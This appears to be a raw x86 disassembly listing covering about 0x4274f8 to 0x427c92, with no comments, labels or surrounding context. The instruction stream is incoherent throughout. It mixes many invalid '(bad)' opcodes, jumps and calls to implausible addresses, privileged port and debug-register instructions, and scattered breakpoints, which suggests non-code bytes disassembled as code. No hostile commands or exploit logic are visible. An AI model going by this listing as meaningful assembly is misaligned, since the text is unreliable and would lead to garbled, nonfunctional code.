  4274f8:	call   0x429e8c
  4274fd:	push   eax
  4274fe:	inc    DWORD PTR [ebp-0x1c]
  427501:	mov    ecx,DWORD PTR [ebp-0x58]
  427504:	xor    eax,DWORD PTR [eax]
  427506:	add    edi,edi
  427508:	cmp    ebp,eax
  42750a:	jne    0x427532
  42750c:	mov    DWORD PTR [eax],0x8b004dd8
  427512:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  427519:	mov    eax,ebx
  42751b:	cld    
  42751c:	test   BYTE PTR [eax+0x320198],bh
  427522:	mov    DWORD PTR [ebp+0x8],esi
  427525:	xor    eax,DWORD PTR [ebp-0x73]
  427528:	test   DWORD PTR [esp+esi*2-0x1],edi
  42752c:	mov    ebp,eax
  42752e:	mov    eax,0x33004d29
  427533:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427539:	add    DWORD PTR [eax],eax
  42753b:	add    BYTE PTR [ebp+0x30],al
  42753e:	mov    edx,DWORD PTR [edi-0x48]
  427541:	add    ebx,0xffffffe4
  427544:	push   0x2b74cd85
  427549:	mov    eax,DWORD PTR [ebx]
  42754b:	cld    
  42754c:	sar    BYTE PTR [eax+0x3b0145],1
  427552:	pcmpeqw mm4,mm6
  427555:	xor    edi,edi
  427557:	lea    ecx,[ebx-0x239c7470]
  42755d:	add    BYTE PTR [ebp+0x50],cl
  427560:	cmp    eax,DWORD PTR [ebp+0x75]
  427563:	mov    ebp,DWORD PTR [eax-0x68]
  427566:	test   DWORD PTR [eax],eax
  427568:	clc    
  427569:	push   DWORD PTR [ebp-0x1]
  42756c:	lea    ecx,[eax]
  42756e:	int3   
  42756f:	inc    ebp
  427570:	call   0xfaa600
  427575:	jne    0x42756f
  427577:	xor    edi,DWORD PTR [ebp-0x41]
  42757a:	jmp    0x4275ee
  42757c:	mov    eax,DWORD PTR [eax]
  42757e:	mov    eax,0x339545c7
  427583:	inc    DWORD PTR [ebx]
  427585:	push   DWORD PTR [ecx]
  427587:	aaa    
  427588:	mov    eax,DWORD PTR [eax]
  42758a:	jmp    0x4275dc
  42758c:	mov    eax,DWORD PTR [ebp-0x3c]
  42758f:	mov    eax,eax
  427591:	cld    
  427592:	clc    
  427593:	ret    
  427594:	test   bh,al
  427596:	pop    es
  427597:	xchg   ebp,eax
  427598:	add    bh,bh
  42759a:	inc    ebp
  42759b:	dec    DWORD PTR [edi]
  42759d:	and    DWORD PTR [ebx],ebp
  42759f:	add    BYTE PTR [eax],al
  4275a1:	push   eax
  4275a2:	jbe    0x4275f9
  4275a4:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  4275aa:	or     al,0xcf
  4275ac:	inc    eax
  4275ad:	enter  0x745,0x72
  4275b1:	inc    ebp
  4275b2:	mov    eax,DWORD PTR [ecx]
  4275b4:	int3   
  4275b5:	add    BYTE PTR [ebp-0x75],al
  4275b8:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  4275be:	ror    BYTE PTR [ebp+0x72f80885],1
  4275c4:	inc    ebp
  4275c5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275cb:	fadd   st,st(6)
  4275cd:	rol    BYTE PTR [ebp+0x12],0x8b
  4275d1:	inc    ebp
  4275d2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275d8:	inc    ebp
  4275d9:	test   bh,al
  4275db:	cwde   
  4275dc:	clc    
  4275dd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275e3:	inc    ebp
  4275e4:	cmp    dh,BYTE PTR [ebx]
  4275e6:	pushf  
  4275e7:	mov    ecx,0xffb48dc7
  4275ec:	test   eax,ecx
  4275ee:	clc    
  4275ef:	dec    ebp
  4275f0:	inc    ebp
  4275f1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275f4:	pushf  
  4275f5:	rol    edi,0x86
  4275f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275f9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275ff:	inc    ebp
  427600:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  427608:	test   DWORD PTR [eax],edi
  42760a:	clc    
  42760b:	pushf  
  42760c:	inc    ebp
  42760d:	dec    DWORD PTR [ebx-0x3cba0f04]
  427613:	push   eax
  427614:	(bad)  
  427615:	cld    
  427616:	jge    0x427618
  427618:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  42761e:	add    BYTE PTR [ebx],dl
  427620:	jmp    0xcd7772
  427625:	les    eax,FWORD PTR [ebp-0x35]
  427628:	mov    ecx,esi
  42762a:	lock or al,cl
  42762d:	clc    
  42762e:	inc    ebp
  42762f:	add    esi,DWORD PTR [ebx]
  427631:	jge    0x427636
  427633:	xor    edi,DWORD PTR [ebx]
  427635:	cmp    ecx,DWORD PTR [edi]
  427637:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42763c:	mov    edi,DWORD PTR [ecx]
  42763e:	test   al,0xcc
  427640:	dec    ebp
  427641:	test   BYTE PTR [ebx],dh
  427643:	pop    es
  427644:	xor    eax,DWORD PTR [eax]
  427646:	add    ecx,DWORD PTR [esi]
  427648:	add    ecx,eax
  42764a:	psraw  mm0,mm1
  42764d:	sub    BYTE PTR [ebp+0x38],cl
  427650:	mov    edi,DWORD PTR [ebx]
  427652:	lock int3 
  427654:	shl    edx,1
  427656:	rol    BYTE PTR [ebp+0xc],1
  427659:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427660:	jmp    0x7b76aa
  427665:	pushf  
  427666:	inc    ebp
  427667:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42766d:	xor    ecx,ebx
  42766f:	add    ecx,esi
  427671:	mov    esi,eax
  427673:	enter  0x45af,0x8b
  427677:	xor    ecx,eax
  427679:	add    edx,DWORD PTR [ebp-0x77]
  42767c:	sub    ecx,DWORD PTR [eax]
  42767e:	cmp    eax,DWORD PTR [ebp+0x77]
  427681:	fmul   DWORD PTR [ebx-0x76385764]
  427687:	test   al,0x0
  427689:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42768f:	cmp    esi,DWORD PTR [ebx]
  427691:	pushf  
  427692:	xor    eax,edi
  427694:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42769b:	inc    ebp
  42769c:	dec    ebp
  42769d:	cmp    eax,0xc7f09c8b
  4276a2:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  4276a9:	inc    ebp
  4276aa:	jmp    0x4276eb
  4276ac:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  4276b3:	dec    ebp
  4276b4:	xor    esi,DWORD PTR [ebx]
  4276b6:	add    eax,DWORD PTR [ebx]
  4276b8:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  4276be:	dec    ebp
  4276bf:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276c5:	out    dx,eax
  4276c6:	rol    BYTE PTR [eax],1
  4276c8:	add    eax,0xebc8458b
  4276cd:	dec    ebp
  4276ce:	mov    ebp,DWORD PTR [ebx]
  4276d0:	mov    esp,0x33f84d8b
  4276d5:	ret    
  4276d6:	xor    eax,esi
  4276d8:	add    ecx,eax
  4276da:	add    eax,DWORD PTR [edx+0xc1010f]
  4276e0:	dec    ebp
  4276e1:	inc    ebp
  4276e2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276e8:	ror    bl,1
  4276ea:	add    eax,0xebc645ce
  4276ef:	scas   eax,DWORD PTR es:[edi]
  4276f0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276f6:	xor    ebp,DWORD PTR [ebx]
  4276f8:	xor    edi,DWORD PTR [ebx]
  4276fa:	add    esi,DWORD PTR [edi+0x3]
  4276fd:	mov    ecx,DWORD PTR [edi]
  4276ff:	clc    
  427700:	rol    ebx,0x4d
  427703:	(bad)  
  427704:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  42770b:	mov    ah,0x45
  42770d:	dec    ebp
  42770e:	jbe    0x427743
  427710:	mov    esi,DWORD PTR [ebx]
  427712:	call   0x3345c41a
  427717:	rdpmc  
  427719:	rol    DWORD PTR [ebx],0x4d
  42771c:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427722:	inc    ebp
  427723:	ror    BYTE PTR [ebx+0x45450808],1
  427729:	jmp    0x10a77b9
  42772e:	inc    ebp
  42772f:	inc    ebp
  427730:	(bad)  
  427731:	mov    ebx,eax
  427733:	clc    
  427734:	test   ebx,eax
  427736:	clc    
  427737:	retf   
  427738:	inc    ebp
  427739:	into   
  42773a:	mov    esi,0x8b85afec
  427740:	clc    
  427741:	enter  0x5545,0x3a
  427745:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42774c:	ret    
  42774d:	mov    ah,0xc6
  42774f:	addr16 push 0x338b4545
  427755:	clc    
  427756:	add    eax,ebx
  427758:	loopne 0x427725
  42775a:	dec    ebp
  42775b:	into   
  42775c:	mov    al,dh
  42775e:	or     BYTE PTR [edi-0x37ff748e],ch
  427764:	inc    ebp
  427765:	push   ebp
  427766:	mov    ebp,DWORD PTR [ebx]
  427768:	in     al,dx
  427769:	cmp    eax,ebx
  42776b:	ja     0x4277b2
  42776d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427773:	inc    ebp
  427774:	cwde   
  427775:	mov    esi,DWORD PTR [edx]
  427777:	clc    
  427778:	mov    bl,al
  42777a:	xlat   BYTE PTR ds:[ebx]
  42777b:	retf   
  42777c:	inc    ebp
  42777d:	into   
  42777e:	mov    eax,esi
  427780:	in     al,dx
  427781:	scas   eax,DWORD PTR es:[edi]
  427782:	retf   
  427783:	mov    ecx,DWORD PTR [ebp-0x38]
  427786:	mov    edx,DWORD PTR [ebp-0x24]
  427789:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427790:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427797:	mov    eax,DWORD PTR [ebx]
  427799:	clc    
  42779a:	loopne 0x42775f
  42779c:	push   ebp
  42779d:	retf   
  42779e:	mov    dh,al
  4277a0:	adc    esi,ecx
  4277a2:	jb     0x427753
  4277a4:	add    BYTE PTR [ebx+0x558bc845],cl
  4277aa:	in     al,dx
  4277ab:	sub    eax,ebx
  4277ad:	cmp    ecx,ebx
  4277af:	mov    eax,esi
  4277b1:	mov    esp,0x45af03ce
  4277b6:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  4277bc:	mov    eax,ebx
  4277be:	in     al,dx
  4277bf:	into   
  4277c0:	dec    ebp
  4277c1:	(bad)  
  4277c2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277c8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277cc:	xor    esp,esp
  4277ce:	sub    eax,DWORD PTR [ebp-0x75]
  4277d1:	add    ebp,esp
  4277d3:	mov    al,0x55
  4277d5:	inc    ebp
  4277d6:	xor    edi,DWORD PTR [eax]
  4277d8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277df:	inc    ebp
  4277e0:	xor    edi,DWORD PTR [ecx]
  4277e2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277e9:	test   DWORD PTR [eax],eax
  4277eb:	clc    
  4277ec:	enter  0x8645,0x33
  4277f0:	inc    DWORD PTR [ebx]
  4277f2:	(bad)  
  4277f3:	jmp    0x42783a
  4277f5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277fb:	inc    ebp
  4277fc:	(bad)  
  4277fd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  427803:	cwde   
  427804:	retf   
  427805:	xor    al,cl
  427807:	mov    BYTE PTR [ebp+0xb],cl
  42780a:	lea    eax,[ebp+0x8]
  42780d:	xor    esi,DWORD PTR [edx+0x3]
  427810:	add    al,ah
  427812:	inc    ebp
  427813:	dec    ebp
  427814:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  42781a:	push   0x2b45cd00
  42781f:	mov    al,BYTE PTR [ebx]
  427821:	or     esi,eax
  427823:	dec    ebp
  427824:	inc    ebp
  427825:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42782b:	push   ebp
  42782c:	(bad)  
  42782d:	mov    BYTE PTR [edi+0xf723b11],ch
  427833:	add    ch,ch
  427835:	inc    ebp
  427836:	dec    DWORD PTR [ebx-0x34332775]
  42783c:	add    al,0x4d
  42783e:	inc    ebp
  42783f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427845:	cwde   
  427846:	add    DWORD PTR [edx],esi
  427848:	add    BYTE PTR [ebx+0x4d00c000],cl
  42784e:	push   DWORD PTR [ebx]
  427850:	int3   
  427851:	xor    eax,DWORD PTR [eax]
  427853:	add    edx,DWORD PTR [eax+0x3]
  427856:	mov    DWORD PTR [edi],ecx
  427858:	call   0x4288391e
  42785d:	mov    DWORD PTR [ebp-0x20],esp
  427860:	add    BYTE PTR [ebp+0x7d],al
  427863:	mov    eax,DWORD PTR [eax]
  427865:	in     al,0x15
  427867:	ret    
  427868:	iret   
  427869:	(bad)  
  42786a:	enter  0x14af,0x8b
  42786e:	(bad)  
  42786f:	in     al,dx
  427870:	or     bl,cl
  427872:	adc    cl,al
  427874:	push   ebp
  427875:	dec    ebp
  427876:	inc    eax
  427877:	mov    edx,DWORD PTR [ebp-0x20]
  42787a:	jb     0x427847
  42787c:	mov    ecx,esi
  42787e:	cld    
  42787f:	scas   eax,DWORD PTR es:[edi]
  427880:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427887:	mov    BYTE PTR [eax],0x8c
  42788a:	push   0xffffff98
  42788c:	push   edi
  42788d:	xor    dl,BYTE PTR [eax+0x3b]
  427890:	mov    ecx,DWORD PTR [edi]
  427892:	call   0x8c41bdf5
  427897:	mov    eax,eax
  427899:	in     al,dx
  42789a:	jge    0x4278e9
  42789c:	mov    DWORD PTR [ebx],esi
  42789e:	int3   
  42789f:	add    eax,DWORD PTR [ebp+0xf]
  4278a2:	xor    eax,ecx
  4278a4:	(bad)  
  4278a5:	dec    ebp
  4278a6:	pushf  
  4278a7:	xor    ecx,eax
  4278a9:	add    edi,DWORD PTR [edi]
  4278ab:	mov    eax,DWORD PTR [ebp-0x38]
  4278ae:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  4278b5:	mov    DWORD PTR [edx+0xf4505c8],ecx
  4278bb:	xor    edx,DWORD PTR [ecx+edi*4]
  4278be:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278c5:	dec    ebp
  4278c6:	leave  
  4278c7:	mov    edx,ecx
  4278c9:	rol    BYTE PTR [ebp+0x330155],1
  4278cf:	add    ecx,DWORD PTR [ebp+0xf]
  4278d2:	xor    eax,edx
  4278d4:	(bad)  
  4278d5:	ror    DWORD PTR [eax],0x86
  4278d8:	jb     0x4278d7
  4278da:	add    bh,bh
  4278dc:	clc    
  4278dd:	inc    ebp
  4278de:	jb     0x42794a
  4278e0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278e6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278ec:	shr    BYTE PTR [eax-0x3d],0x30
  4278f0:	clc    
  4278f1:	add    BYTE PTR [ebp+0x75],al
  4278f4:	cmp    BYTE PTR [edx-0x64],ch
  4278f7:	inc    edi
  4278f9:	adc    al,0xe8
  4278fb:	inc    ebp
  4278fc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  427902:	mov    ecx,DWORD PTR [eax]
  427904:	cld    
  427905:	or     DWORD PTR [ebp-0x34],0x33
  427909:	jbe    0x42790e
  42790b:	mov    edx,DWORD PTR [ecx+0x2b]
  42790e:	dec    ebp
  42790f:	mov    cl,BYTE PTR [ebx+0x45d801]
  427915:	mov    BYTE PTR [ebx],dh
  427917:	mov    eax,DWORD PTR [ebx]
  427919:	or     BYTE PTR [ecx+0x3b],dl
  42791c:	dec    ebp
  42791d:	int3   
  42791e:	xor    ebp,edi
  427920:	add    eax,DWORD PTR [ebp+0x51]
  427923:	mov    ecx,DWORD PTR [ebp-0x28]
  427926:	xor    eax,DWORD PTR [eax]
  427928:	add    ebp,DWORD PTR [eax+0x51]
  42792b:	adc    BYTE PTR [eax+0x0],0x8b
  42792f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427935:	inc    ebp
  427936:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42793c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427942:	dec    ebp
  427943:	mov    esi,DWORD PTR [ebx]
  427945:	hlt    
  427946:	add    eax,ebx
  427948:	push   ecx
  427949:	inc    ebp
  42794a:	dec    ebp
  42794b:	sar    bh,1
  42794d:	shl    ah,1
  42794f:	(bad)  
  427950:	retf   
  427951:	mov    al,ds:0xc5ff3dce
  427956:	adc    al,0xc6
  427958:	inc    ebp
  427959:	and    eax,0x9c0f4c85
  42795e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427965:	cmp    BYTE PTR [ebx+0x3b],0x0
  427969:	mov    dh,0xc7
  42796b:	cmp    eax,eax
  42796d:	jne    0x454371b9
  427973:	mov    edi,DWORD PTR [edx]
  427975:	mov    eax,0x848bcb9c
  42797a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427981:	or     BYTE PTR [edi],cl
  427983:	(bad)  
  427984:	dec    ebp
  427985:	inc    edi
  427986:	add    bh,0x50
  427989:	or     cl,ch
  42798b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427991:	xchg   DWORD PTR [eax-0x1638af64],eax
  427997:	mov    esp,0xf802b588
  42799c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42799d:	inc    ebp
  42799e:	(bad)  
  42799f:	cmp    al,0xff
  4279a1:	pushf  
  4279a2:	or     DWORD PTR [ecx+0x45ffe474],0x0
  4279a9:	mov    ecx,DWORD PTR [ebp-0x340018]
  4279af:	into   
  4279b0:	dec    DWORD PTR [ebx-0x7f72431c]
  4279b6:	push   0x5000ff01
  4279bb:	retf   
  4279bc:	inc    ebp
  4279bd:	into   
  4279be:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279c4:	push   eax
  4279c5:	into   
  4279c6:	call   0x4a7e56
  4279cb:	retf   
  4279cc:	add    dh,cl
  4279ce:	add    bh,bh
  4279d0:	mov    DWORD PTR [eax+ecx*1],edx
  4279d3:	clc    
  4279d4:	inc    ebp
  4279d5:	inc    ebp
  4279d6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279dc:	push   0x1
  4279de:	push   edi
  4279df:	add    BYTE PTR [eax-0x35],dl
  4279e2:	mov    ecx,esi
  4279e4:	cld    
  4279e5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279eb:	into   
  4279ec:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279f3:	xor    eax,DWORD PTR [ebp+0x3]
  4279f6:	jne    0x427a49
  4279f8:	call   DWORD PTR [eax-0x3c]
  4279fb:	mov    DWORD PTR [ecx-0x18],edx
  4279fe:	mov    edi,edi
  427a00:	call   0x8b45bf89
  427a05:	add    ah,ah
  427a07:	rol    BYTE PTR [ebp-0x7c],0xeb
  427a0b:	add    edi,edi
  427a0d:	add    al,ch
  427a0f:	inc    ebp
  427a10:	push   ecx
  427a11:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  427a17:	mov    al,0xc7
  427a19:	test   esp,esp
  427a1b:	clc    
  427a1c:	test   DWORD PTR [ebp-0x8],ecx
  427a1f:	add    BYTE PTR [ebp+0x50],0x39
  427a23:	jmp    0x8bcc02c4
  427a28:	in     al,dx
  427a29:	or     BYTE PTR [ebp-0xf],al
  427a2c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a32:	hlt    
  427a33:	mov    eax,DWORD PTR [ebp-0x50]
  427a36:	xor    esi,ecx
  427a38:	add    eax,DWORD PTR [eax+0x4f086889]
  427a3e:	inc    ebp
  427a3f:	sbb    eax,0x68
  427a42:	pushf  
  427a43:	inc    edi
  427a45:	add    al,ch
  427a47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a48:	test   edi,edi
  427a4a:	clc    
  427a4b:	inc    DWORD PTR [ebp-0x73]
  427a4e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a52:	(bad)  
  427a53:	push   ecx
  427a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a55:	jne    0x4279dc
  427a57:	push   eax
  427a58:	clc    
  427a59:	test   DWORD PTR [ebp-0x1],eax
  427a5c:	cmp    eax,0xc78b9cff
  427a61:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a68:	inc    ebp
  427a69:	push   edi
  427a6a:	aas    
  427a6b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a72:	dec    ebp
  427a73:	add    BYTE PTR [ebx],dh
  427a75:	inc    ebp
  427a76:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a7c:	enter  0x8401,0x0
  427a80:	add    al,BYTE PTR [eax]
  427a82:	add    bh,bh
  427a84:	out    dx,eax
  427a85:	sbb    BYTE PTR [eax],al
  427a87:	dec    ebp
  427a88:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a8e:	sub    esi,DWORD PTR [ebx]
  427a90:	mov    ebp,DWORD PTR [eax-0x8]
  427a93:	add    bl,0x0
  427a96:	(bad)  
  427a97:	cmp    eax,ecx
  427a99:	or     BYTE PTR [edx+0x750114],al
  427a9f:	inc    DWORD PTR [ebp+0x18]
  427aa2:	mov    eax,DWORD PTR [ebp-0x8]
  427aa5:	mov    ebx,eax
  427aa7:	(bad)  
  427aa8:	retf   
  427aa9:	inc    ebp
  427aaa:	into   
  427aab:	mov    esi,eax
  427aad:	int3   
  427aae:	scas   eax,DWORD PTR es:[edi]
  427aaf:	push   es
  427ab0:	mov    esi,DWORD PTR [ebp-0xc]
  427ab3:	call   DWORD PTR [ebp+0x18]
  427ab6:	sub    edi,DWORD PTR [ebp+0x3b]
  427ab9:	mov    esi,DWORD PTR [edi-0x34]
  427abc:	mov    eax,DWORD PTR [ebp-0x8]
  427abf:	cmp    bl,al
  427ac1:	pushf  
  427ac2:	mov    bh,0xbc
  427ac5:	fadd   QWORD PTR [eax]
  427ac7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427acd:	mov    esi,DWORD PTR [ebx]
  427acf:	in     al,0x33
  427ad1:	ret    
  427ad2:	add    eax,esi
  427ad4:	add    eax,DWORD PTR [ebp+0xf]
  427ad7:	mov    eax,ecx
  427ad9:	in     al,0x4d
  427adb:	ret    
  427adc:	mov    eax,esi
  427ade:	in     al,dx
  427adf:	inc    ebp
  427ae0:	rol    edi,1
  427ae2:	sar    al,1
  427ae4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aea:	add    BYTE PTR [edx],bh
  427aec:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427af3:	test   ebx,eax
  427af5:	clc    
  427af6:	retf   
  427af7:	inc    ebp
  427af8:	into   
  427af9:	cmp    al,0xc6
  427afb:	pushf  
  427afc:	scas   eax,DWORD PTR es:[edi]
  427afd:	(bad)  
  427afe:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427b05:	inc    ebp
  427b06:	cmp    edi,DWORD PTR [esi]
  427b08:	ja     0x427aa6
  427b0a:	mov    eax,edi
  427b0c:	mov    esp,0x458567a8
  427b11:	clc    
  427b12:	mov    eax,DWORD PTR [ebp-0x8]
  427b15:	mov    eax,ebx
  427b17:	in     al,dx
  427b18:	retf   
  427b19:	ret    
  427b1a:	into   
  427b1b:	mov    dh,0x7d
  427b1e:	scas   eax,DWORD PTR es:[edi]
  427b1f:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b25:	add    BYTE PTR [ebx],ch
  427b27:	jmp    0xb97c67
  427b2c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b2f:	mov    eax,DWORD PTR [ebp-0x14]
  427b32:	inc    ebp
  427b33:	enter  0x458b,0xf8
  427b37:	xor    eax,ebx
  427b39:	add    ecx,ebx
  427b3b:	cmp    ecx,esi
  427b3d:	shufps xmm7,xmm4,0xaf
  427b41:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b47:	dec    ebp
  427b48:	sub    esi,DWORD PTR [ebx]
  427b4a:	cmp    esi,DWORD PTR [ebx]
  427b4c:	ja     0x427b51
  427b4e:	mov    eax,DWORD PTR [ebx]
  427b50:	lods   al,BYTE PTR ds:[esi]
  427b51:	mov    db0,ecx
  427b54:	inc    ebp
  427b55:	dec    ebp
  427b56:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b5c:	retf   
  427b5d:	rol    dh,1
  427b5f:	or     al,0xce
  427b61:	inc    ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b69:	add    BYTE PTR [ebx],ch
  427b6b:	add    BYTE PTR [ebx],bh
  427b6d:	inc    ebp
  427b6e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b74:	inc    ebp
  427b75:	retf   
  427b76:	mov    ecx,esi
  427b78:	clc    
  427b79:	(bad)  
  427b7a:	retf   
  427b7b:	scas   eax,DWORD PTR es:[edi]
  427b7c:	ret    
  427b7d:	mov    ecx,esi
  427b7f:	hlt    
  427b80:	(bad)  
  427b81:	push   ebp
  427b82:	scas   eax,DWORD PTR es:[edi]
  427b83:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b89:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b8f:	add    BYTE PTR [ebx],al
  427b91:	mov    eax,eax
  427b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b94:	inc    ebp
  427b95:	dec    ebp
  427b96:	cmp    BYTE PTR [ebx],dh
  427b98:	pushf  
  427b99:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b9f:	(bad)  
  427ba1:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427ba9:	sar    eax,1
  427bab:	rol    BYTE PTR [ebp+0x5],1
  427bae:	xor    eax,DWORD PTR [ebp+0x3]
  427bb1:	jmp    0x427b9e
  427bb3:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427bb9:	xor    eax,DWORD PTR [ebp+0x33]
  427bbc:	mov    eax,DWORD PTR [ebx]
  427bbe:	rol    BYTE PTR [ebx],1
  427bc0:	test   BYTE PTR [edi],cl
  427bc2:	cwde   
  427bc3:	shl    DWORD PTR [edx],0x4d
  427bc6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bcc:	xor    edx,eax
  427bce:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bd4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bda:	add    BYTE PTR [ebx],dh
  427bdc:	inc    ebp
  427bdd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427be3:	rdpmc  
  427be5:	rol    DWORD PTR [ebx],0x4d
  427be8:	loopne 0x427b75
  427bea:	push   ebp
  427beb:	in     al,dx
  427bec:	mov    cl,dl
  427bee:	adc    eax,edx
  427bf0:	jb     0x427bf7
  427bf2:	add    BYTE PTR [ebp+0x45],al
  427bf5:	jmp    0x427b82
  427bf7:	mov    ebx,eax
  427bf9:	test   al,0xcb
  427bfb:	dec    ebp
  427bfc:	dec    ebp
  427bfd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427c03:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427c09:	dec    ebp
  427c0a:	mov    al,0x8b
  427c0c:	dec    ebp
  427c0d:	in     al,dx
  427c0e:	xor    edx,ecx
  427c10:	xor    edx,eax
  427c12:	add    eax,DWORD PTR [ebp+0x3]
  427c15:	jbe    0x427c26
  427c17:	mov    eax,ecx
  427c19:	test   al,0x45
  427c1b:	dec    ebp
  427c1c:	mov    DWORD PTR [ebx],esi
  427c1e:	loopne 0x427c53
  427c20:	inc    ebp
  427c21:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c27:	rol    esi,0x45
  427c2a:	scas   eax,DWORD PTR es:[edi]
  427c2b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c31:	mov    eax,ecx
  427c33:	hlt    
  427c34:	dec    ebp
  427c35:	inc    ebp
  427c36:	mov    eax,edi
  427c38:	loopne 0x427c12
  427c3a:	retf   
  427c3b:	test   esi,ecx
  427c3d:	clc    
  427c3e:	scas   eax,DWORD PTR es:[edi]
  427c3f:	inc    ebp
  427c40:	mov    eax,edi
  427c42:	fdiv   st,st(0)
  427c44:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c4a:	cwde   
  427c4b:	cmp    dh,BYTE PTR [edx]
  427c4d:	pushf  
  427c4e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c54:	inc    esi
  427c56:	mov    ebp,DWORD PTR [eax-0x10]
  427c59:	inc    ebp
  427c5a:	dec    ebp
  427c5b:	xor    esi,DWORD PTR [ebx]
  427c5d:	add    eax,DWORD PTR [ebx]
  427c5f:	loopne 0x427c70
  427c61:	dec    ebp
  427c62:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c69:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c6f:	lock cwde 
  427c71:	ret    
  427c72:	xor    al,BYTE PTR [ebp-0x77]
  427c75:	mov    esi,esp
  427c77:	rol    BYTE PTR [ebp-0x7c],1
  427c7a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c80:	call   edi
  427c82:	enter  0x4d45,0x8b
  427c86:	mov    esi,eax
  427c88:	fmul   st(3),st
  427c8a:	push   ebp
  427c8b:	dec    ebp
  427c8c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c92:	ret    0xc198
